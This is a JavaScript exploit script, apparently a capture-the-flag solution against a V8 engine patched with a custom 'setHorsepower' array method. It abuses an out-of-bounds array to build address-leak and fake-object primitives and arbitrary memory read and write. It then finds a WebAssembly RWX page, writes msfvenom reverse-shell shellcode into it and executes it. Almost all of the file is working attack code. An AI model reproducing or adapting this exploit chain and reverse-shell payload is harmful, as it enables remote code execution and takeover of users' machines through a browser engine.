var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var float_arr = [1.1, 2.2];
float_arr.setHorsepower(13);
var float_arr_map = float_arr[2];

var initial_obj = {A:1};
var obj_arr = [initial_obj];

console.log("[+] Float array map: 0x" + ftoi(float_arr_map).toString(16));

function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(float_arr[12]) & 0xffffffffn;
}

function fakeobj(fake_obj) {
    float_arr[12] = itof((ftoi(float_arr[12]) & (0xffffffffn << 32n)) + fake_obj);
    return obj_arr[0];
}

var arb_rw_arr = [float_arr_map, 1.1, 2.2, 3.3];
var fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function arbread(addr) {
    if (addr % 2n == 0){
    	addr += 1n;
    }
    arb_rw_arr[1] = itof((2n << 32n) + addr - 8n);
    return ftoi(fake[0]);
}

function arb_write(addr, val) {
    arb_rw_arr[1] = itof((2n << 32n) + addr - 8n);
    fake[0] = itof(BigInt(val));
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_main_func = wasm_instance.exports.main;

var rwx_page_addr = arbread(addrof(wasm_instance) + 0x68n);
console.log("[+] RWX Region located at 0x" + rwx_page_addr.toString(16));

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x14n;
    arb_write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	    dataview.setUint32(4*i, shellcode[i], true);
    }
}

console.log("[+] Copying shellcode to RWX page");

//msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f dword
var payload = [0x9958296a, 0x6a5f026a, 0x050f5e01, 0xb9489748, 0xbb010002, 0x0100007f, 0xe6894851, 0x6a5a106a, 0x050f582a, 0x485e036a, 0x216aceff, 0x75050f58, 0x583b6af6, 0x2fbb4899, 0x2f6e6962, 0x53006873, 0x52e78948, 0xe6894857, 0x0000050f]
copy_shellcode(rwx_page_addr, payload);
wasm_main_func();

